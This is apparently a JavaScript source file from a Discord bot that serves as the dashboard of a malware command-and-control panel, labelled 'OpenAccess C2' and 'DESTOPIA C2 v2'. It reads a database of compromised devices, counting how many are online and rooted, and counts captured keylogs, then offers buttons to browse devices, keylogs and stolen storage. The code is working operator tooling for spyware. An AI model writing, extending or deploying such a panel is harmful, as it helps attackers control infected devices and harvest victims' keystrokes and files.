import { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } from 'discord.js'
import { randomGif } from './_utils.js'

export const name = 'menu'

export async function execute(message, _args, { supabase }) {
  const { data: devices } = await supabase
    .from('devices')
    .select('device_id, last_seen, root_status')
    .limit(100)

  const { count: keylogCount } = await supabase
    .from('keylogs')
    .select('id', { count: 'exact', head: true })

  const now = Date.now()
  const total = devices?.length || 0
  const online = devices?.filter(d => d.last_seen && (now - new Date(d.last_seen).getTime() < 300000)).length || 0
  const rooted = devices?.filter(d => d.root_status === 'rooted').length || 0

  const embed = new EmbedBuilder()
    .setColor(0x0a0a1a)
    .setTitle('🏠 OpenAccess C2 Dashboard')
    .setImage(randomGif('dashboard'))
    .setDescription([
      '```',
      '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
      `  📡  ${String(total).padStart(3)} Devices  ·  ${String(online).padStart(2)} Online  ·  ${String(rooted).padStart(2)} Rooted`,
      `  ⌨  ${String(keylogCount || 0).padStart(6)} Keylogs captured`,
      '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
      '```',
    ].join('\n'))
    .setFooter({ text: 'DESTOPIA C2 v2 • !menu' })
    .setTimestamp()

  const row = new ActionRowBuilder()
    .addComponents(
      new ButtonBuilder().setCustomId('c2:devices:list').setLabel('📡 Devices').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId('c2:keylogs:list').setLabel('⌨ Keylogs').setStyle(ButtonStyle.Secondary),
      new ButtonBuilder().setCustomId('c2:storage:list').setLabel('📁 Storage').setStyle(ButtonStyle.Secondary),
      new ButtonBuilder().setCustomId('c2:help:show').setLabel('ℹ Help').setStyle(ButtonStyle.Secondary),
      new ButtonBuilder().setCustomId('c2:menu:status').setLabel('📊 Status').setStyle(ButtonStyle.Success),
    )

  await message.reply({ embeds: [embed], components: [row] })
}
